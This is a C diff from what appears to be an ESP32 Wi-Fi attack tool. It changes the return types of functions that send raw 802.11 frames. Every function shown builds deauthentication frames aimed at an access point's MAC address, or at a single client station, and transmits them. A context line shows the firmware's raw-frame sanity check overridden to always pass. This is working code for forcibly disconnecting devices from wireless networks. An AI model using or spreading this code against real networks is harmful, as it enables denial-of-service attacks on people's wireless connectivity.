@@ -44,21 +44,21 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
     return 0;
 }
 
-void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+esp_err_t wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
+    return esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
 }
 
-void wsl_bypasser_send_deauth_frame(uint8_t* ap_mac){
+esp_err_t wsl_bypasser_send_deauth_frame(uint8_t* ap_mac){
     ESP_LOGD(TAG, "Sending deauth frame...");
     uint8_t deauth_frame[sizeof(deauth_frame_default)];
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_mac, 6);
     memcpy(&deauth_frame[16], ap_mac, 6);
     
-    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    return wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
 
-void wsl_bypasser_send_deauth_frame_targted(uint8_t* ap_mac, uint8_t* sta_mac)
+esp_err_t wsl_bypasser_send_deauth_frame_targted(uint8_t* ap_mac, uint8_t* sta_mac)
 {
     uint8_t deauth_frame[sizeof(deauth_frame_default)];
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
@@ -66,5 +66,5 @@ void wsl_bypasser_send_deauth_frame_targted(uint8_t* ap_mac, uint8_t* sta_mac)
     memcpy(&deauth_frame[10], ap_mac, 6);
     memcpy(&deauth_frame[16], ap_mac, 6);
     
-    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    return wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
